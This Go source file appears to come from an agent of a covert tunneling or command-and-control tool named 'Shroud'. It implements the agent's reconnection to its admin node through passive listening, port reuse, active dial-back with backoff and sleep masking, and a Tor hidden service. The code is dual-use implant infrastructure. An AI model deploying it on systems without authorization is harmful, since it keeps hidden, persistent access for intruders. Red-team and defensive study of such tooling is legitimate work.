package process

import (
	"crypto/tls"
	"fmt"
	"log"
	"net"
	"time"

	"Shroud/agent/initial"
	"Shroud/global"
	"Shroud/protocol"
	"Shroud/share"
	"Shroud/share/transport"
	"Shroud/utils"

	reuseport "github.com/libp2p/go-reuseport"
)

func normalPassiveReconn(options *initial.Options) (net.Conn, []byte) {
	listenAddr, _, err := utils.CheckIPPort(options.Listen)
	if err != nil {
		log.Fatalf("[*] Error occurred: %s", err.Error())
	}

	listener, err := net.Listen("tcp", listenAddr)
	if err != nil {
		log.Fatalf("[*] Error occurred: %s", err.Error())
	}

	defer func() {
		listener.Close()
	}()

	var sMessage, rMessage protocol.Message

	hiMess := &protocol.HIMess{
		GreetingLen: uint16(len("Keep silent")),
		Greeting:    "Keep silent",
		UUIDLen:     uint16(len(global.G_Component.UUID)),
		UUID:        global.G_Component.UUID,
		IsAdmin:     0,
		IsReconnect: 1,
	}

	header := &protocol.Header{
		Sender:      global.G_Component.UUID,
		Accepter:    protocol.ADMIN_UUID,
		MessageType: protocol.HI,
		RouteLen:    uint32(len([]byte(protocol.TEMP_ROUTE))),
		Route:       protocol.TEMP_ROUTE,
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("[*] Error occurred: %s\n", err.Error())
			continue
		}

		if global.Session.TLSEnable {
			var tlsConfig *tls.Config
			tlsConfig, err = transport.NewServerTLSConfig()
			if err != nil {
				log.Printf("[*] Error occurred: %s", err.Error())
				conn.Close()
				continue
			}
			conn = transport.WrapTLSServerConn(conn, tlsConfig)
		}

		param := new(protocol.NegParam)
		param.Conn = conn
		proto := protocol.NewUpProto(param)
		proto.SNegotiate()

		linkKey, _, err := share.PassiveAgentAuthAndExchange(conn, global.Session.AgentIdentity)
		if err != nil {
			conn.Close()
			continue
		}

		rMessage = protocol.NewUpMsg(conn, global.G_Component.CryptoKey, linkKey, protocol.TEMP_UUID)
		fHeader, fMessage, err := protocol.DestructMessage(rMessage)

		if err != nil {
			conn.Close()
			continue
		}

		if fHeader.MessageType == protocol.HI {
			mmess := fMessage.(*protocol.HIMess)
			if mmess.Greeting == "Shhh..." && mmess.IsAdmin == 1 {
				sMessage = protocol.NewUpMsg(conn, global.G_Component.CryptoKey, linkKey, protocol.TEMP_UUID)
				protocol.ConstructMessage(sMessage, header, hiMess, false)
				sMessage.SendMessage()
				return conn, linkKey
			}
		}

		conn.Close()
	}
}

func ipTableReusePassiveReconn(options *initial.Options) (net.Conn, []byte) {
	return normalPassiveReconn(options)
}

func soReusePassiveReconn(options *initial.Options) (net.Conn, []byte) {
	listenAddr := fmt.Sprintf("%s:%s", options.ReuseHost, options.ReusePort)

	listener, err := reuseport.Listen("tcp", listenAddr)
	if err != nil {
		log.Fatalf("[*] Error occurred: %s", err.Error())
	}

	defer func() {
		listener.Close()
	}()

	var sMessage, rMessage protocol.Message

	hiMess := &protocol.HIMess{
		GreetingLen: uint16(len("Keep silent")),
		Greeting:    "Keep silent",
		UUIDLen:     uint16(len(global.G_Component.UUID)),
		UUID:        global.G_Component.UUID,
		IsAdmin:     0,
		IsReconnect: 1,
	}

	header := &protocol.Header{
		Sender:      global.G_Component.UUID,
		Accepter:    protocol.ADMIN_UUID,
		MessageType: protocol.HI,
		RouteLen:    uint32(len([]byte(protocol.TEMP_ROUTE))),
		Route:       protocol.TEMP_ROUTE,
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("[*] Error occurred: %s\n", err.Error())
			continue
		}

		if global.Session.TLSEnable {
			var tlsConfig *tls.Config
			tlsConfig, err = transport.NewServerTLSConfig()
			if err != nil {
				log.Printf("[*] Error occurred: %s", err.Error())
				conn.Close()
				continue
			}
			conn = transport.WrapTLSServerConn(conn, tlsConfig)
		}

		param := new(protocol.NegParam)
		param.Conn = conn
		proto := protocol.NewUpProto(param)
		proto.SNegotiate()

		linkKey, _, err := share.SoReuseAgentAuthAndExchange(conn, options.ReusePort, global.Session.AgentIdentity)
		if err != nil {
			continue
		}

		rMessage = protocol.NewUpMsg(conn, global.G_Component.CryptoKey, linkKey, protocol.TEMP_UUID)
		fHeader, fMessage, err := protocol.DestructMessage(rMessage)

		if err != nil {
			conn.Close()
			continue
		}

		if fHeader.MessageType == protocol.HI {
			mmess := fMessage.(*protocol.HIMess)
			if mmess.Greeting == "Shhh..." && mmess.IsAdmin == 1 {
				sMessage = protocol.NewUpMsg(conn, global.G_Component.CryptoKey, linkKey, protocol.TEMP_UUID)
				protocol.ConstructMessage(sMessage, header, hiMess, false)
				sMessage.SendMessage()
				return conn, linkKey
			}
		}

		conn.Close()
	}
}

func normalReconnActiveReconn(options *initial.Options, proxy share.Proxy) (net.Conn, []byte) {
	var sMessage, rMessage protocol.Message

	hiMess := &protocol.HIMess{
		GreetingLen: uint16(len("Shhh...")),
		Greeting:    "Shhh...",
		UUIDLen:     uint16(len(global.G_Component.UUID)),
		UUID:        global.G_Component.UUID,
		IsAdmin:     0,
		IsReconnect: 1,
	}

	header := &protocol.Header{
		Sender:      global.G_Component.UUID,
		Accepter:    protocol.ADMIN_UUID,
		MessageType: protocol.HI,
		RouteLen:    uint32(len([]byte(protocol.TEMP_ROUTE))),
		Route:       protocol.TEMP_ROUTE,
	}

	base := time.Duration(options.Reconnect) * time.Second
	attempt := 0

	reconSleep := func(d time.Duration) {
		if options.SleepMask {
			SleepMask(d)
		} else {
			time.Sleep(d)
		}
	}

	for {
		var (
			conn net.Conn
			err  error
		)

		if proxy == nil {
			conn, err = net.Dial("tcp", options.Connect)
		} else {
			conn, err = proxy.Dial()
		}

		if err != nil {
			reconSleep(backoffDuration(attempt, base))
			attempt++
			continue
		}

		if global.Session.TLSEnable {
			var tlsConfig *tls.Config
			tlsConfig, err = transport.NewClientTLSConfig(options.Domain, options.TlsFingerprint, options.TlsInsecure)
			if err != nil {
				conn.Close()
				reconSleep(backoffDuration(attempt, base))
				attempt++
				continue
			}
			conn = transport.WrapTLSClientConn(conn, tlsConfig)
		}

		param := new(protocol.NegParam)
		param.Conn = conn
		param.Domain = options.Domain
		proto := protocol.NewUpProto(param)
		proto.CNegotiate()

		linkKey, err := share.ActiveAgentAuthAndExchange(conn, global.Session.AgentIdentity)
		if err != nil {
			conn.Close()
			reconSleep(backoffDuration(attempt, base))
			attempt++
			continue
		}

		sMessage = protocol.NewUpMsg(conn, global.G_Component.CryptoKey, linkKey, protocol.TEMP_UUID)

		protocol.ConstructMessage(sMessage, header, hiMess, false)
		sMessage.SendMessage()

		rMessage = protocol.NewUpMsg(conn, global.G_Component.CryptoKey, linkKey, protocol.TEMP_UUID)
		fHeader, fMessage, err := protocol.DestructMessage(rMessage)

		if err != nil {
			conn.Close()
			reconSleep(backoffDuration(attempt, base))
			attempt++
			continue
		}

		if fHeader.MessageType == protocol.HI {
			mmess := fMessage.(*protocol.HIMess)
			if mmess.Greeting == "Keep silent" && mmess.IsAdmin == 1 {
				return conn, linkKey
			}
		}

		conn.Close()
		reconSleep(backoffDuration(attempt, base))
		attempt++
	}
}

func torHiddenPassiveReconn(options *initial.Options) (net.Conn, []byte) {
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		log.Fatalf("[*] Error occurred: %s", err.Error())
	}

	localPort := listener.Addr().(*net.TCPAddr).Port

	tc := share.NewTorControl(options.TorControl, options.TorControlPW)
	if err := tc.Connect(); err != nil {
		listener.Close()
		log.Fatalf("[*] Cannot reconnect Tor control: %s", err.Error())
	}
	if err := tc.Authenticate(); err != nil {
		listener.Close()
		tc.Close()
		log.Fatalf("[*] Tor control auth failed: %s", err.Error())
	}

	onionAddr, err := tc.AddOnion(localPort, localPort)
	if err != nil {
		listener.Close()
		tc.Close()
		log.Fatalf("[*] Failed to recreate hidden service: %s", err.Error())
	}

	log.Printf("[*] Tor hidden service re-established: %s:%d\n", onionAddr, localPort)

	defer listener.Close()

	var sMessage, rMessage protocol.Message

	hiMess := &protocol.HIMess{
		GreetingLen: uint16(len("Keep silent")),
		Greeting:    "Keep silent",
		UUIDLen:     uint16(len(global.G_Component.UUID)),
		UUID:        global.G_Component.UUID,
		IsAdmin:     0,
		IsReconnect: 1,
	}

	header := &protocol.Header{
		Sender:      global.G_Component.UUID,
		Accepter:    protocol.ADMIN_UUID,
		MessageType: protocol.HI,
		RouteLen:    uint32(len([]byte(protocol.TEMP_ROUTE))),
		Route:       protocol.TEMP_ROUTE,
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("[*] Error occurred: %s\n", err.Error())
			continue
		}

		param := new(protocol.NegParam)
		param.Conn = conn
		proto := protocol.NewUpProto(param)
		proto.SNegotiate()

		linkKey, _, err := share.PassiveAgentAuthAndExchange(conn, global.Session.AgentIdentity)
		if err != nil {
			conn.Close()
			continue
		}

		rMessage = protocol.NewUpMsg(conn, global.G_Component.CryptoKey, linkKey, protocol.TEMP_UUID)
		fHeader, fMessage, err := protocol.DestructMessage(rMessage)

		if err != nil {
			conn.Close()
			continue
		}

		if fHeader.MessageType == protocol.HI {
			mmess := fMessage.(*protocol.HIMess)
			if mmess.Greeting == "Shhh..." && mmess.IsAdmin == 1 {
				sMessage = protocol.NewUpMsg(conn, global.G_Component.CryptoKey, linkKey, protocol.TEMP_UUID)
				protocol.ConstructMessage(sMessage, header, hiMess, false)
				sMessage.SendMessage()
				return conn, linkKey
			}
		}

		conn.Close()
	}
}
